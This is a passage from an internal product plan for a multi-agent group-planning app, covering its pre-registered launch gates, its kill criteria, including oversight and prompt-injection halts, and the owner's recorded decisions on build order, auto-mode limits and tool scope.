## 8. Pre-registered gates and kill criteria

**Gates (before the next phase builds):**

1. **Overhead gate.** Instrument outcomes by number of enrolled agents. If
   single-enrolled sessions are statistically indistinguishable from
   multi-enrolled on the same card type, the multi-agent layer is overhead for
   that type: demote it to single-agent and stop spending rounds machinery.
2. **Repeat gate.** No card type shows a second _voluntary_ session in the same
   circle by week 6 → the sandbox is a demo; ship watch + Decision Card as
   standalone features and shelve the engine.
3. **Round-tax gate.** Median rounds-to-ratification > 5 on negotiation → humans
   would have been faster; fix convergence before scaling.
4. **Consent gate.** Auto uptake < 30% by week 4 once P2 exists → the enrollment
   model is scary or pointless; redesign consent before adding card types.

5. **Oversight-efficacy gate (§0, and it is a gate on autonomy itself).** In
   dogfood, ask an owner cold: "what did your agent just do on this card, and
   was it worth it?" If they cannot answer from the pane in under ~15 seconds
   without opening the raw feed, **the pane has failed and auto-mode does not
   advance a phase.** Oversight legibility is a prerequisite for autonomy, not a
   companion to it.

**Kill criteria:**

- Session views per human < ~30% of week-1 by week 3 AND artifacts not re-opened
  in week 3+ → **stop marketing/optimizing the live view as an experience and
  cut spectator polish.** Note what this does NOT kill: the oversight pane,
  pause, budget meters, and §3.1 containment stay regardless — they are safety
  surfaces, and a pane nobody watches recreationally is still doing its job.
- Blind quality compare: multi-agent rounds fail to beat single-agent on the same
  card while costing >3x tokens → **cap sessions at one round, permanently.**
- Any prompt-injection propagation through an enrolled agent in red-teaming →
  **halt** (the §11 worm tripwire applies here with more force than anywhere).
- Any card type muted by >20% of enrolled users → halve its cadence fleet-wide.
- Rabbit-hole containment misses: any session that loops, drifts, or grinds
  without the owner being able to see and stop it → **auto-mode reverts to
  propose fleet-wide** until the detector that missed it is fixed.

**The 30-second demo (the cool test, and the P-1 script):** a canvas card,
"Spring trip: June, 4 people." Four petnamed agent chips. Round 1, each agent
posts what its human never typed into this room: _Sam's calendar blocks June
12-14. Ana's ceiling is $900, no red-eyes. Dev's agent pulled live fares._
Round 2 fills a Decision Card, one dissent noted and resolved. Second 25: a
finished itinerary, every line signed by the agent that contributed it, "waiting
on 2 human approvals." Two taps. Done. **Note what is magic: private memories
intersecting and the kept artifact. Zero of it is "watching rounds" — which is
why the demo works as a replay, and why §0's correction is right.**

Counterfactual: assume OpenAI can replicate the demo's _appearance_ within six
months (their group-chat memory firewall was a policy choice, reversible with one
consent screen). What survives replication: user-owned nodes, per-member signed
attribution, and no cloud singleton reading four people's private context.

---

## 9. Decisions for Victor

1. ~~**Framing.**~~ **CLOSED 2026-07-27 by Victor's clarification:** "watch the
   agents" = oversight (rabbit-hole containment + visibility), not spectacle. The
   plan carries both conclusions: artifacts drive retention, oversight is
   mandatory irrespective of engagement. §0, §3.1, and §6.2 updated; no decision
   pending.
2. **Phase order. CLOSED 2026-07-27: full multi-agent first.** Victor chose the
   negotiation card over the single-agent watch card ("let's be efficient").
   Overrides the recommendation (watch-first) and the holistic review's advice;
   trades risk-retirement for testing the real thesis sooner. §7 P1 rewritten.
3. **P-1 prototype. CLOSED 2026-07-27: skipped.** Rationale: Victor is the first
   user, will test the built artifact directly and adjust on the fly.
   Consequences absorbed into §7: build order is thin-slice-first with a
   deliberate reassessment point after the first on-screen session, and
   solo-degraded mode is promoted to load-bearing test infrastructure (P1.0).
4. **Auto-mode ambition. CLOSED 2026-07-27: constrained moves only**, framed as
   "until the field solves free-text safely," not forever. Propose mode still
   carries free text behind a human tap, so the only capability forgone is
   _unattended_ free-text posting — the worst risk-to-value trade in the plan.
5. **Steer visibility. CLOSED 2026-07-27: private**, plus the framing fix: the
   UI states globally that every agent acts for its human and may be directed by
   them at any time. Direction is the assumption, not a flagged exception, so
   there is nothing to hide and nothing to chill.
6. **Key rotation. CLOSED 2026-07-27: accept the restriction.** Rotation is not
   funded now; P2 auto-append stays refused in circles with removal history. The
   refusal must be legible and dated when it fires ("sandbox unavailable here
   because a member was removed and channel keys cannot yet be rotated"), per the
   §3.1 rule that every terminal state is legible. Rotation gets scheduled before
   public launch, where it is load-bearing anyway.

### 9.2 Open decisions from the tools/canvas escalation `[new 2026-07-27]`

7. **Cross-member images.** Both reviews refuse for v1 (T10: phishing-lookalike
   screenshots have no technical mitigation). You get own-agent-local
   screenshots and cross-member evidence cards. Accept, or fund the middle
   option (raster-only, re-encoded, hard-chromed, hash-pinned)?
8. **Tool scope.** Accept the two-entry allowlist (`web_search`, `web_fetch`)
   and the permanent skills refusal, or push for more surface with the
   machinery that would require?
9. **Plan-first vs ticker-first.** The evidence says build the pre-flight plan
   gate and the plan-vs-actual diff rather than the live scrolling list. This
   is close to but not identical to what you asked for; confirm the swap.
10. **Shared WIP backpressure.** Cap un-reviewed agent output in flight across
    the circle. Nobody ships it, it is the single highest-leverage mechanic
    found, and it will occasionally block an eager member. In or out?

### 9.1 Standing risk accepted by decisions 2 + 3 (recorded, not re-litigated)

Choosing the largest build with the least prior validation is a deliberate,
owner-made trade. It is written down once here so a later reader knows it was
chosen rather than overlooked, and so the mitigations are visible:

- **Mitigated by:** thin-slice build order with a named reassessment point
  (§7 P1 (b)); solo-degraded mode first so the thing is testable by one person;
  propose-mode-only in P1, so nothing autonomous ships before dogfood; §8 gates
  retained and read against dogfood instead of interviews.
- **Unmitigated:** if the thesis is wrong (agents contributing private context
  does not feel valuable), that is discovered after ~1,500 LOC rather than after
  a days-long prototype. Accepted knowingly.
